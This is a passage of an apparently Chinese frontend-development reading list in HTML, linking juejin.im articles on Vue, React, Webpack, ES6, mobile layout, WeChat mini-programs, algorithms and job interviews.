项目开发流程中的疑惑点</a></li><li><a href="https://juejin.im/post/5b45df255188251b1d474860" target="_blank" rel="noopener">手把手教你封装 Vue 组件，并使用 npm 发布</a></li><li><a href="https://juejin.im/post/5bd97e7c6fb9a022852a71cf" target="_blank" rel="noopener">vue 组件通信全揭秘(共 7 章)</a></li><li><a href="https://juejin.im/post/5b592635e51d4533d2043e15" target="_blank" rel="noopener">手把手教你用原生 JavaScript 造轮子（1）——分页器（最后更新：Vue 插件版本，本篇 Over！）</a></li><li><a href="https://juejin.im/post/5cab64ce5188251b19486041" target="_blank" rel="noopener">「Vue 实践」武装你的前端项目</a></li><li><a href="https://juejin.im/post/5c3c544c6fb9a049d37f5903" target="_blank" rel="noopener">vue-cli3 从搭建到优化</a></li><li><a href="https://juejin.im/post/5a7914386fb9a063543c0f44" target="_blank" rel="noopener">Vue 实战篇（Vue 仿今日头条）</a></li><li><a href="https://juejin.im/post/5cde0b43f265da03867e78d3" target="_blank" rel="noopener">Vue 组件间通信六种方式（完整版）</a></li><li><a href="https://juejin.im/post/5a0d5df1f265da43062a542f" target="_blank" rel="noopener">[译] 2017 年比较 Angular、React、Vue 三剑客 </a></li><li><a href="https://juejin.im/post/5aca46e2f265da238c3af4ca" target="_blank" rel="noopener">仿美团外卖的全栈项目(vue+node+mongodb)带支付-&gt;大三求实习</a></li><li><a href="https://juejin.im/post/5ae02f39518825672f198ac2" target="_blank" rel="noopener">Vue 使用中的小技巧</a></li><li><a href="https://juejin.im/post/5ba358a56fb9a05d2068401d" target="_blank" rel="noopener">Vue 页面跳转动画效果实现</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fsegmentfault.com%2Fa%2F1190000014963269%3Futm_source%3Dchannel-hottest" target="_blank" rel="noopener">Vue 页面骨架屏 </a></li><li><a href="https://juejin.im/post/5b80f4e36fb9a019ce148fe9" target="_blank" rel="noopener">干货分享：vue2.0 做移动端开发用到的相关插件和经验总结(更新)</a></li><li><a href="https://juejin.im/post/5b6f8eeb6fb9a0098729aa68" target="_blank" rel="noopener">当大多数人对 Vue 理解到炉火纯青的时候，是不是该思考一下怎么让 vue 页面骚气起来</a></li><li><a href="https://juejin.im/post/5cdcbae9e51d454759351d84" target="_blank" rel="noopener">vue 路由 按需 keep-alive</a></li><li><a href="https://juejin.im/post/5ad56d86518825556534ff4b" target="_blank" rel="noopener">vue 中需要注意的问题总结(上)</a></li><li><a href="https://juejin.im/post/5a3c73c2f265da4310488f20" target="_blank" rel="noopener">关于 vue 全家桶的四个 “最佳实践”</a></li><li><a href="https://juejin.im/post/5a291092518825293b50366d" target="_blank" rel="noopener">Vue SPA 首屏加载优化实践</a></li><li><a href="https://juejin.im/post/5ab2ff496fb9a028c06ab78f" target="_blank" rel="noopener">你应该要知道的 Vue.js</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Felemefe%2Fv-charts" target="_blank" rel="noopener">v-charts | 饿了么团队开源的基于 Vue 和 ECharts 的图表工具</a></li><li><a href="https://juejin.im/post/5a711724518825733201ebb1" target="_blank" rel="noopener">使用 vue 构建一个自动建站项目</a></li><li><a href="https://juejin.im/post/5a121e4b6fb9a045076f41a3" target="_blank" rel="noopener">也许 Vue+CSS3 做交互特效更简单</a></li><li><a href="https://juejin.im/post/5ae91fa76fb9a07aa7677543" target="_blank" rel="noopener">Vue.js 中 watch 的高级用法</a></li><li><a href="https://juejin.im/post/5a0c191f6fb9a04514639419" target="_blank" rel="noopener">vue 快速入门的三个小实例</a></li><li><a href="https://juejin.im/post/5b8e526051882542a82baba6" target="_blank" rel="noopener">VuePress 手摸手教你搭建一个类 Vue 文档风格的技术文档/博客</a></li><li><a href="https://juejin.im/post/5cb3eed65188251b0351f2c4" target="_blank" rel="noopener">封装 Vue 组件的一些技巧</a></li><li><a href="https://juejin.im/post/5b3027cce51d4558c65216a9" target="_blank" rel="noopener">没朋友(mpvue)，点个外卖，一个人也要好好吃饭</a></li><li><a href="https://juejin.im/post/5b2fd09ee51d45588576f429" target="_blank" rel="noopener">一个 Vue 页面的内存泄露分析</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.zcfy.cc%2Farticle%2Fthe-best-explanation-of-javascript-reactivity" target="_blank" rel="noopener">Vue.js 是如何做到数据响应的？</a></li><li><a href="https://juejin.im/post/5a716c4c6fb9a01cb42cac4b" target="_blank" rel="noopener">Vue 项目自动转换 px 为 rem，高保真还原设计图</a></li><li><a href="https://juejin.im/post/5cd8b450e51d453a580fa8e1" target="_blank" rel="noopener">少女风 vue 组件库制作全攻略~~</a></li><li><a href="https://juejin.im/post/59cb19d95188257e84671938" target="_blank" rel="noopener">Vant - 高效的 Vue 组件库，再造一个有赞移动商城也不在话下</a></li><li><a href="https://juejin.im/post/5c106485e51d450e657571a6" target="_blank" rel="noopener">加快 Vue 项目的开发速度</a></li><li><a href="https://juejin.im/post/5ad56aad51882532ce65affa" target="_blank" rel="noopener">基于 react/vue 的移动端终极适配方案（更新 css-modules 配置）</a></li><li><a href="https://juejin.im/post/5c73554cf265da2de33f2a32" target="_blank" rel="noopener">「从源码中学习」Vue 源码中的 JS 骚操作</a></li><li><a href="https://juejin.im/post/5adc99f56fb9a07abd0d3ee7" target="_blank" rel="noopener">Vue 还有这种骚操作？浅析几个新手常常忽略的 API</a></li><li><a href="https://juejin.im/post/5ab07a63f265da2389258b12" target="_blank" rel="noopener">Vue 源码简析(版本 vue-2.4.4)</a></li><li><a href="https://juejin.im/post/5b5697675188251b11097464" target="_blank" rel="noopener">VueRouter 源码深度解析</a></li><li><a href="https://juejin.im/post/5b97e60a5188255c5d567aea" target="_blank" rel="noopener">干货分享：vue2.0 做移动端开发用到的相关插件和经验总结(2)</a></li><li><a href="https://juejin.im/post/5bdec6e8e51d4505327a8952" target="_blank" rel="noopener">一份超级详细的 Vue-cli3.0 使用教程[赶紧来试试！]</a></li><li><a href="https://juejin.im/post/5ae986636fb9a07ac3634826" target="_blank" rel="noopener">入职第一天：前端 leader 手把手教我入门 Vue 服务器端渲染（SSR）</a></li><li><a href="https://juejin.im/post/5b98e5875188255c8320f88a" target="_blank" rel="noopener">通过 vue-cli3 构建一个 SSR 应用程序</a></li><li><a href="https://juejin.im/post/5b86f6cc5188256fd44c0ce9" target="_blank" rel="noopener">Vue.js 从 Virtual DOM 映射到真实 DOM 的过程</a></li><li><a href="https://juejin.im/post/5a31ddb251882527541053ee" target="_blank" rel="noopener">使用 VUE 分分钟写一个验证码输入组件</a></li><li><a href="https://juejin.im/post/5b18c50d5188251377116fe9" target="_blank" rel="noopener">vue 实践中的常见知识漏洞 001</a></li><li><a href="https://juejin.im/post/5ce5565d6fb9a07ed2244513" target="_blank" rel="noopener">【前端词典】学习 Vue 源码的必要知识储备</a></li><li><a href="https://juejin.im/post/59f2845e6fb9a0451a759e85" target="_blank" rel="noopener">Vue2 原理浅谈</a></li><li><a href="https://juejin.im/post/5b063962f265da0ddb63dac3" target="_blank" rel="noopener">解密 Vue SSR</a></li><li><a href="https://juejin.im/post/5b610da4e51d45195c07720d" target="_blank" rel="noopener">Vue 全站缓存之 keep-alive ： 动态移除缓存</a></li><li><a href="https://juejin.im/post/5afba3c5f265da0b9e653b6c" target="_blank" rel="noopener">淘宝、网易移动端 px 转换 rem 原理，Vue-cli 实现 px 转换 rem</a></li><li><a href="https://juejin.im/post/5b1a3eba6fb9a01e4320cb68" target="_blank" rel="noopener">Vue 源码的最后一站</a></li><li><a href="https://juejin.im/post/5b71587bf265da282a765096" target="_blank" rel="noopener">vue 全家桶仿某鱼部分布局以及功能实现</a></li><li><a href="https://juejin.im/post/5b1fa77451882513ea5cc2ca" target="_blank" rel="noopener">50 行代码的 MVVM，感受闭包的艺术</a></li><li><a href="https://juejin.im/post/5abdd6f6f265da23793c4458" target="_blank" rel="noopener">不好意思！耽误你的十分钟，让 MVVM 原理还给你</a></li></ul><h2 id="React"><a href="#React" class="headerlink" title="React"></a>React</h2><ul><li><a href="https://juejin.im/post/5d085be0f265da1bac401937" target="_blank" rel="noopener">掘金最污的 React16.x 图文视频教程(2 万 5 千字长文-慎入)</a></li><li><a href="https://juejin.im/post/5b506ae0e51d45191a0d4ec9" target="_blank" rel="noopener">React 16 加载性能优化指南</a></li><li><a href="https://juejin.im/post/5cfe4b13f265da1bb13f26a8" target="_blank" rel="noopener">webpack4 的 30 个步骤打造优化到极致的 react 开发环境，如约而至</a></li><li><a href="https://juejin.im/post/5be3ea136fb9a049f9121014" target="_blank" rel="noopener">30 分钟精通 React Hooks</a></li><li><a href="https://juejin.im/post/5a84682ef265da4e83266cc4" target="_blank" rel="noopener">《React 源码解析》系列完结！</a></li><li><a href="https://juejin.im/post/5c0c7304f265da613e22106c" target="_blank" rel="noopener">200 行代码实现简版 react</a></li><li><a href="https://juejin.im/post/5ce24f8ae51d45106477bd45" target="_blank" rel="noopener">可能是你需要的 React + TypeScript 50 条规范和经验</a></li><li><a href="https://juejin.im/post/5b07caf16fb9a07aa83f2977" target="_blank" rel="noopener">TypeScript 2.8 下的终极 React 组件模式</a></li><li><a href="https://juejin.im/post/5ad81c24f265da504c168c85" target="_blank" rel="noopener">怎样学习 React？当然是自己动手实现一个 React 啦</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2FSangKa%2Freact-in-patterns-cn" target="_blank" rel="noopener">《React in patterns》 中文版来了</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F39744174" target="_blank" rel="noopener">React 学习路线图 - 2018 版</a></li><li><a href="https://juejin.im/post/5b45c57c51882519790c7441" target="_blank" rel="noopener">你真的理解 setState 吗？</a></li></ul><h2 id="Webpack"><a href="#Webpack" class="headerlink" title="Webpack"></a>Webpack</h2><ul><li><a href="https://juejin.im/post/5aa3d2056fb9a028c36868aa" target="_blank" rel="noopener">webpack 详解</a></li><li><a href="https://juejin.im/post/5adea0106fb9a07a9d6ff6de" target="_blank" rel="noopener">webpack4-用之初体验，一起敲它十一遍</a></li><li><a href="https://juejin.im/post/5a068c2b5188255851322b8c" target="_blank" rel="noopener">妈妈再也不用担心我不会 webpack 了</a></li><li><a href="https://juejin.im/post/5badd0c5e51d450e4437f07a" target="_blank" rel="noopener">Webpack 揭秘——走向高阶前端的必经之路</a></li><li><a href="https://juejin.im/post/59bb37fa6fb9a00a554f89d2" target="_blank" rel="noopener">webpack：从入门到真实项目配置</a></li><li><a href="https://juejin.im/post/5b304f1f51882574c72f19b0" target="_blank" rel="noopener">Webpack 4 配置最佳实践</a></li><li><a href="https://juejin.im/post/5b4609f5e51d4519596b66a7" target="_blank" rel="noopener">手写一个 webpack4.0 配置</a></li><li><a href="https://juejin.im/post/5cea1e1ae51d4510664d1652" target="_blank" rel="noopener">关于 webpack4 的 14 个知识点,童叟无欺</a></li><li><a href="https://juejin.im/post/5bf61082f265da616a474b5c" target="_blank" rel="noopener">脑阔疼的 webpack 按需加载</a></li><li><a href="https://juejin.im/post/5c25b76ef265da614b120ed0" target="_blank" rel="noopener">📚 免费的渐进式教程：Webpack4 的 16 篇讲解和 16 份代码</a></li><li><a href="https://juejin.im/post/5b192afde51d45069c2efe5a" target="_blank" rel="noopener">手把手教你撸一个简易的 webpack</a></li><li><a href="https://juejin.im/post/5b38d27451882574d87aa5d5" target="_blank" rel="noopener">不聊 webpack 配置，来说说它的原理</a></li><li><a href="https://juejin.im/post/5a23b130f265da432003101a" target="_blank" rel="noopener">简单易懂的 webpack 打包后 JS 的运行过程</a></li><li><a href="https://juejin.im/post/5b652b036fb9a04fa01d616b" target="_blank" rel="noopener">三十分钟掌握 Webpack 性能优化</a></li><li><a href="https://juejin.im/post/5cb36a3ef265da03a1581d6d" target="_blank" rel="noopener">从基础到实战 手摸手带你掌握新版 Webpack4.0 详解 一起读文档</a></li><li><a href="https://juejin.im/post/5be64a7bf265da615304493e" target="_blank" rel="noopener">webpack4 配置详解之慢嚼细咽</a></li><li><a href="https://juejin.im/post/5ac9dc9af265da23884d5543" target="_blank" rel="noopener">带你走进 webpack 世界，成为 webpack 头号玩家。</a></li><li><a href="https://juejin.im/post/5b56909a518825195f499806" target="_blank" rel="noopener">手摸手，带你用合理的姿势使用 webpack4（上）</a></li><li><a href="https://juejin.im/post/5ad1d85f518825651d081c68" target="_blank" rel="noopener">webpack 从此不再是我们的痛点 — 核心基础</a></li><li><a href="https://juejin.im/post/5b9116086fb9a05d05307e96" target="_blank" rel="noopener">webpack4 多页面，多环境配置</a></li><li><a href="https://juejin.im/post/5a63f082f265da3e303c95cc" target="_blank" rel="noopener">webpack 增量打包多页应用</a></li></ul><h2 id="ES6"><a href="#ES6" class="headerlink" title="ES6"></a>ES6</h2><ul><li><a href="https://juejin.im/post/5ca2e1935188254416288eb2" target="_blank" rel="noopener">ES6、ES7、ES8、ES9、ES10 新特性一览</a></li><li><a href="https://juejin.im/post/5c6234f16fb9a049a81fcca5" target="_blank" rel="noopener">近一万字的 ES6 语法知识点补充</a></li><li><a href="https://juejin.im/post/5b6d6f8ae51d453509566974" target="_blank" rel="noopener">ES6 核心，值得驻足花一天时间来学习</a></li><li><a href="https://juejin.im/post/5bfe05505188252098022400" target="_blank" rel="noopener">ES6 完全使用手册</a></li><li><a href="https://juejin.im/post/5b9cb3336fb9a05d290ee47e" target="_blank" rel="noopener">ES6、ES7、ES8 特性一锅炖(ES6、ES7、ES8 学习指南)</a></li><li><a href="https://juejin.im/post/5aaa37c8f265da23945f365c" target="_blank" rel="noopener">前端模块化：CommonJS,AMD,CMD,ES6</a></li><li><a href="https://juejin.im/post/5cd1ab3df265da03587c142a" target="_blank" rel="noopener">「中高级前端」窥探数据结构的世界- ES6 版</a></li><li><a href="https://juejin.im/post/5acb1847f265da237c693362" target="_blank" rel="noopener">学会了 ES6，就不会写出那样的代码</a></li><li><a href="https://juejin.im/post/5b7b95206fb9a019bd2463d8" target="_blank" rel="noopener">小邵教你玩转 ES6</a></li><li><a href="https://juejin.im/post/59d7790e6fb9a00a496e926a" target="_blank" rel="noopener">ES6 常用知识点概述</a></li><li><a href="https://juejin.im/post/5a08e5c55188252abc5dd96f" target="_blank" rel="noopener">实例感受-es6 的常用语法和优越性</a></li><li><a href="https://juejin.im/post/5abf531d6fb9a028dc412419" target="_blank" rel="noopener">ES6 会这些就够了</a></li><li><a href="https://juejin.im/post/5b2a186cf265da596d04a648" target="_blank" rel="noopener">[译] ES2018（ES9）的新特性</a></li></ul><h2 id="移动端"><a href="#移动端" class="headerlink" title="移动端"></a>移动端</h2><ul><li><a href="https://juejin.im/post/5cddf289f265da038f77696c" target="_blank" rel="noopener">关于移动端适配，你必须要知道的</a></li><li><a href="https://juejin.im/post/5b72e1f66fb9a009d018fb94" target="_blank" rel="noopener">移动端调试痛点？——送你五款前端开发利器</a></li><li><a href="https://juejin.im/post/5af918636fb9a07ac5603ecb" target="_blank" rel="noopener">移动端常见 bug 汇总 001</a></li><li><a href="https://juejin.im/post/5b346e8f5188251e1d39bd09" target="_blank" rel="noopener">真的，移动端尺寸自适应与 dpr 无关</a></li><li><a href="https://juejin.im/post/5c0dd7ac6fb9a049c43d7edc" target="_blank" rel="noopener">移动端适配总结</a></li><li><a href="https://juejin.im/post/5b6575b0518825196b01fd85" target="_blank" rel="noopener">web 移动端布局的那些事儿</a></li><li><a href="https://juejin.im/post/5d33fd0f5188256e820c80d4" target="_blank" rel="noopener">实战篇 - 如何实现和淘宝移动端一样的模块化加载 （task-silce）</a></li><li><a href="https://juejin.im/post/5b29f476e51d455892718380" target="_blank" rel="noopener">如何利用 vw+rem 进行移动端布局</a></li><li><a href="https://juejin.im/post/5ad0b52d6fb9a028d82c30c1" target="_blank" rel="noopener">轻松掌握移动端 web 开发【尺寸适配】常用解决方案</a></li><li><a href="https://juejin.im/post/5add7a44f265da0b886d05f8" target="_blank" rel="noopener">移动端适配问题解决方案</a></li><li><a href="https://juejin.im/post/59dc572c6fb9a0450f20e40e" target="_blank" rel="noopener">BetterScroll：可能是目前最好用的移动端滚动插件</a></li><li><a href="https://juejin.im/post/5b6d21daf265da0f9d1a2ed7" target="_blank" rel="noopener">移动端适配知识你到底知多少</a></li><li><a href="https://juejin.im/post/5a02d91ef265da43085d756c" target="_blank" rel="noopener">滴滴 Web 移动端组件库 cube-ui 开源</a></li><li><a href="https://juejin.im/post/5a5f46ac51882573520d6f8b" target="_blank" rel="noopener">移动端自适应个人理解与收集——rem</a></li><li><a href="https://juejin.im/post/5b7efb2ee51d45388b6af96c" target="_blank" rel="noopener">H5 唤起 APP 指南(附开源唤端库)</a></li><li><a href="https://juejin.im/post/5a17c5e26fb9a04527254689" target="_blank" rel="noopener">一次 H5 「保存页面为图片」 的踩坑之旅</a></li><li><a href="https://juejin.im/post/5aa8b00c51882555627cfa0e" target="_blank" rel="noopener">H5 与 APP 混合开发遇到的问题总结</a></li><li><a href="https://juejin.im/post/5b03b2ee5188254284525e87" target="_blank" rel="noopener">移动端 H5 多页开发拍门砖经验</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fyezihaohao.github.io%2F2018%2F03%2F30%2FH5%E6%89%8B%E6%9C%BA%E7%AB%AF%E5%BC%80%E5%8F%91%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F" target="_blank" rel="noopener">H5 手机端开发问题汇总及解决方案</a></li><li><a href="https://juejin.im/post/5abc4f8c6fb9a028d37578ab" target="_blank" rel="noopener">multipages-generator 今日发布 👏！妈妈再也不用担心移动端 h5 网站搭建了！</a></li><li><a href="https://juejin.im/post/5a044fd5f265da43333ddabd" target="_blank" rel="noopener">手机/移动前端开发需要注意的 20 个要点</a></li></ul><h2 id="小程序"><a href="#小程序" class="headerlink" title="小程序"></a>小程序</h2><ul><li><a href="https://juejin.im/post/5b8fd1416fb9a05cf3710690" target="_blank" rel="noopener">近两万字小程序攻略发布了</a></li><li><a href="https://juejin.im/post/5b3d9378f265da0f6012eb65" target="_blank" rel="noopener">VS Code 折腾记 - (14) 再来推荐一波大前端适用系列 (Node/React/Vue/小程序/主题/代码体验等) 的插件</a></li><li><a href="https://juejin.im/post/5b481d216fb9a04fdb16a88f" target="_blank" rel="noopener">微信小程序：一个 json 帮你完成分享朋友圈图片</a></li><li><a href="https://juejin.im/post/5ac9b72cf265da23906c486a" target="_blank" rel="noopener">手把手教会你小程序登录鉴权</a></li><li><a href="https://juejin.im/post/5b0ccd4e51882515861d2347" target="_blank" rel="noopener">送给写小程序的你。</a></li><li><a href="https://juejin.im/post/5a61b6a1518825732739af03" target="_blank" rel="noopener">从零开始一个微信小程序版知乎</a></li><li><a href="https://juejin.im/post/5b0e431f51882515497d979f" target="_blank" rel="noopener">只需两步快速获取微信小程序源码</a></li><li><a href="https://juejin.im/post/5b15ce94f265da6e29010554" target="_blank" rel="noopener">滴滴一夏， 小程序专车来了</a></li><li><a href="https://juejin.im/post/5b39bbcc5188252ce018c745" target="_blank" rel="noopener">两天撸一个天气应用微信小程序</a></li><li><a href="https://juejin.im/post/5b6323baf265da0f5511533a" target="_blank" rel="noopener">网易严选商城小程序全栈开发,域名备案中近期上线(mpvue+koa2+mysql)</a></li><li><a href="https://juejin.im/post/5ba57b7c5188255c971fda3a" target="_blank" rel="noopener">做完小程序项目、老板给我加了 6k 薪资～</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2FMeituan-Dianping%2Fmpvue" target="_blank" rel="noopener">mpvue - 美团点评开源的基于 Vue 的微信小程序前端框架</a></li><li><a href="https://juejin.im/post/5b72cf88e51d45666436d3c5" target="_blank" rel="noopener">两周撸一个掘金微信小程序</a></li><li><a href="https://juejin.im/post/5ba0bc8d6fb9a05d396f0827" target="_blank" rel="noopener">小程序的全栈开发新时代</a></li><li><a href="https://juejin.im/post/5b74d85751882560fb24b6c5" target="_blank" rel="noopener">小程序开发实践总结</a></li><li><a href="https://juejin.im/post/5baf4a04e51d450ea52fd9a4" target="_blank" rel="noopener">H5 和小程序拍照图片旋转、压缩和上传</a></li></ul><h2 id="设计模式与算法"><a href="#设计模式与算法" class="headerlink" title="设计模式与算法"></a>设计模式与算法</h2><ul><li><a href="https://juejin.im/post/5afe6430518825428630bc4d" target="_blank" rel="noopener">JavaScript 中常见设计模式整理</a></li><li><a href="https://juejin.im/post/59df4f74f265da430f311909" target="_blank" rel="noopener">JavaScript 设计模式</a></li><li><a href="https://juejin.im/post/5c2e10a76fb9a049c0432697" target="_blank" rel="noopener">《JavaScript 设计模式与开发实践》最全知识点汇总大全</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Ftrekhleb%2Fjavascript-algorithms%2Fblob%2Fmaster%2FREADME.zh-CN.md" target="_blank" rel="noopener">JavaScript 算法与数据结构</a></li><li><a href="https://juejin.im/post/5b331bc7f265da598451fd88" target="_blank" rel="noopener">前端你应该了解的数据结构与算法</a></li></ul><h2 id="面试"><a href="#面试" class="headerlink" title="面试"></a>面试</h2><ul><li><a href="https://juejin.im/post/5d23e750f265da1b855c7bbe" target="_blank" rel="noopener">前端 100 问：能搞懂 80% 的请把简历给我</a></li><li><a href="https://juejin.im/post/5b94d8965188255c5a0cdc02" target="_blank" rel="noopener">2018 前端面试总结，看完弄懂，工资少说加 3K | 掘金技术征文</a></li><li><a href="https://juejin.im/post/5c64d15d6fb9a049d37f9c20" target="_blank" rel="noopener">中高级前端大厂面试秘籍，为你保驾护航金三银四，直通大厂(上)</a></li><li><a href="https://juejin.im/post/5b44a485e51d4519945fb6b7" target="_blank" rel="noopener">总结了 17 年初到 18 年初百场前端面试的面试经验(含答案)</a></li><li><a href="https://juejin.im/post/5a998991f265da237f1dbdf9" target="_blank" rel="noopener">2018 春招前端面试: 闯关记(精排精校) | 掘金技术征文</a></li><li><a href="https://juejin.im/post/5aae076d6fb9a028cc6100a9" target="_blank" rel="noopener">前端面试考点多？看这些文章就够了（2019 年 6 月更新版）</a></li><li><a href="https://juejin.im/post/5c9c3989e51d454e3a3902b6" target="_blank" rel="noopener">「中高级前端面试」JavaScript 手写代码无敌秘籍</a></li><li><a href="https://juejin.im/post/5a9b8417518825558251ce15" target="_blank" rel="noopener">记录面试中一些回答不够好的题（Vue 居多） | 掘金技术征文</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fsegmentfault.com%2Fa%2F1190000013331105" target="_blank" rel="noopener">面试的信心来源于过硬的基础</a></li><li><a href="https://juejin.im/post/5ac61da66fb9a028c71eae1b" target="_blank" rel="noopener">面试官: 你了解前端路由吗?</a></li><li><a href="https://juejin.im/post/5d124a12f265da1b9163a28d" target="_blank" rel="noopener">这儿有 20 道大厂面试题等你查收</a></li><li><a href="https://juejin.im/post/5cab0c45f265da2513734390" target="_blank" rel="noopener">【面试篇】寒冬求职季之你必须要懂的原生 JS(上)</a></li><li><a href="https://juejin.im/post/5aa8a07cf265da238a3022a4" target="_blank" rel="noopener">几道高级前端面试题解析</a></li><li><a href="https://juejin.im/post/5b2f02cd5188252b937548ab" target="_blank" rel="noopener">BAT 前端经典面试问题：史上最最最详细的手写 Promise 教程</a></li><li><a href="https://juejin.im/post/5d0644976fb9a07ed064b0ca" target="_blank" rel="noopener">[译] 送你 43 道 JavaScript 面试题</a></li><li><a href="https://juejin.im/post/5ad4094e6fb9a028d7011069" target="_blank" rel="noopener">小哥哥,小姐姐,我有一份 tcp、http 面试指南你要吗？</a></li><li><a href="https://juejin.im/post/5befeb5051882511a8527dbe" target="_blank" rel="noopener">一年半经验，百度、有赞、阿里前端面试总结</a></li><li><a href="https://juejin.im/post/5b72f0caf265da282809f3b5" target="_blank" rel="noopener">前端笔试&amp;面试爬坑系列—算法</a></li><li><a href="https://juejin.im/post/5adf0085518825673123da9a" target="_blank" rel="noopener">当面试官问你 Vue 响应式原理，你可以这么回答他</a></li><li><a href="https://juejin.im/post/5d2ee123e51d4577614761f8" target="_blank" rel="noopener">20 道 JS 原理题助你面试一臂之力！</a></li><li><a href="https://juejin.im/post/5a99f80cf265da238c3a1e16" target="_blank" rel="noopener">当面试官问你如何进行性能优化时，你该这么回答(一)</a></li><li><a href="https://juejin.im/post/5cb0315f518825215e61ec14" target="_blank" rel="noopener">【周刊-2】三年大厂面试官-前端面试题（偏难）</a></li><li><a href="https://juejin.im/post/5b31a4b7f265da595725f322" target="_blank" rel="noopener">面试精选之 Promise</a></li><li><a href="https://juejin.im/post/5abb55ee6fb9a028e33b7e0a" target="_blank" rel="noopener">面试官:请你实现一个深克隆</a></li><li><a href="https://juejin.im/post/5c19c1b6e51d451d1e06c163" target="_blank" rel="noopener">腾讯前端面试篇（一）</a></li><li><a href="https://juejin.im/post/5c6977e46fb9a049fd1063dc" target="_blank" rel="noopener">【半月刊】前端高频面试题及答案汇总</a></li><li><a href="https://juejin.im/post/5aad40e4f265da237f1e12ed" target="_blank" rel="noopener">前端笔试题面试题记录（上）| 掘金技术征文</a></li><li><a href="https://juejin.im/post/5cc55c336fb9a032086dd701" target="_blank" rel="noopener">面试官：自己搭建过 vue 开发环境吗？</a></li><li><a href="https://juejin.im/post/5b4a9136f265da0f990d49cb" target="_blank" rel="noopener">地表最强面试图谱</a></li><li><a href="https://juejin.im/post/5d1d52aff265da1bb2774de0" target="_blank" rel="noopener">面试官到底想看什么样的简历？</a></li><li><a href="https://juejin.im/post/5a92c23b5188257a6b06110b" target="_blank" rel="noopener">面试分享：专科半年经验面试阿里前端 P6+总结(附面试真题及答案)</a></li><li><a href="https://juejin.im/post/5acd0c8a6fb9a028da7cdfaf" target="_blank" rel="noopener">面试官: 实现双向绑定 Proxy 比 defineproperty 优劣如何?</a></li><li><a href="https://juejin.im/post/5a59db5a518825732d7f8ce5" target="_blank" rel="noopener">合格前端系列第九弹-前端面试那些事</a></li><li><a href="https://juejin.im/post/5b68f384f265da0fa00a3df0" target="_blank" rel="noopener">一点感悟：当走完所有大厂的实习面试后</a></li><li><a href="https://juejin.im/post/5af3cc4af265da0ba3521028" target="_blank" rel="noopener">社招中级前端笔试面试题总结</a></li><li><a href="https://juejin.im/post/5bf5610be51d452a1353b08d" target="_blank" rel="noopener">2019 年前端面试都聊啥？一起来看看</a></li><li><a href="https://juejin.im/post/5c92f499f265da612647b754" target="_blank" rel="noopener">(中篇)中高级前端大厂面试秘籍，寒冬中为您保驾护航，直通大厂</a></li><li><a href="https://juejin.im/post/5acc17cb51882555745a03f8" target="_blank" rel="noopener">面试题：你能写一个 Vue 的双向数据绑定吗？</a></li><li><a href="https://juejin.im/post/5c02142fe51d4511be77aad7" target="_blank" rel="noopener">面试官(6): 写过『通用前端组件』吗?</a></li><li><a href="https://juejin.im/post/5ce4171ff265da1bd04eb4f3" target="_blank" rel="noopener">2019 前端面试 | “HTML + CSS + JS”专题</a></li><li><a href="https://juejin.im/post/5a96c6326fb9a063626408c8" target="_blank" rel="noopener">2018 美团前端面试题，两年经验，你能答对几道？</a></li><li><a href="https://juejin.im/post/5bd97627f265da39651c0a4b" target="_blank" rel="noopener">三年前端，面试思考（头条蚂蚁美团 offer）</a></li><li><a href="https://juejin.im/post/5cf0733de51d4510803ce34e" target="_blank" rel="noopener">你要的 React 面试知识点，都在这了</a></li><li><a href="https://juejin.im/post/5ca0425e51882567ce181037" target="_blank" rel="noopener">五年面试，三年模拟</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fwww.itcodemonkey.com%2Farticle%2F2853.html" target="_blank" rel="noopener">50 道 CSS 基础面试题（附答案）</a></li><li><a href="https://juejin.im/post/5aa00229f265da239b40fc02" target="_blank" rel="noopener">此面试题版本落后-请勿观看</a></li><li><a href="https://juejin.im/post/5c8e4cd3f265da67c87454a0" target="_blank" rel="noopener">jsliang 的 2019 面试准备</a></li><li><a href="https://juejin.im/post/5b5567b25188256256696ee0" target="_blank" rel="noopener">面试图谱：前端基础技术知识讲解</a></li><li><a href="https://juejin.im/post/5b1a512de51d45068f65ccfe" target="_blank" rel="noopener">JS 高级之面试必须知道的几个点</a></li><li><a href="https://juejin.im/post/5ab70735f265da237a4cf9b1" target="_blank" rel="noopener">大厂前端面试考什么? | 掘金技术征文</a></li><li><a href="https://juejin.im/post/5cbd1e33e51d45789161d053" target="_blank" rel="noopener">【面试篇】寒冬求职季之你必须要懂的原生 JS(中)</a></li><li><a href="https://juejin.im/post/5ab0da85f265da23866fb9b7" target="_blank" rel="noopener">面试分享：2018 阿里巴巴前端面试总结 | 掘金技术征文</a></li><li><a href="https://juejin.im/post/5c3d8956e51d4511dc72c200" target="_blank" rel="noopener">一次弄懂 Event Loop（彻底解决此类面试问题）</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fsegmentfault.com%2Fa%2F1190000014321635%3Futm_source%3Dindex-hottest" target="_blank" rel="noopener">面试之 JavaScript 篇</a></li><li><a href="https://juejin.im/post/59cb6307f265da064e1f65b9" target="_blank" rel="noopener">前端面试之 webpack 篇</a></li><li><a href="https://juejin.im/post/5b3c87386fb9a04f9a5cb037" target="_blank" rel="noopener">面试精选之 http 缓存</a></li><li><a href="https://juejin.im/post/5bbaa549e51d450e827b6b13" target="_blank" rel="noopener">一篇文章搞定前端面试</a></li><li><a href="https://juejin.im/post/5c8bb79e6fb9a04a006fe79a" target="_blank" rel="noopener">写给初级前端的面试经验</a></li><li><a href="https://juejin.im/post/5c62b92de51d457fd77b22ce" target="_blank" rel="noopener">前端面试之路二(javaScript 基础整理)</a></li><li><a href="https://juejin.im/post/59ffb4b66fb9a04512385402" target="_blank" rel="noopener">vue 面试题总汇</a></li><li><a href="https://link.juejin.im/?target=https%3A%2F%2Fgithub.com%2Fqiu-deqing%2FFE-interview" 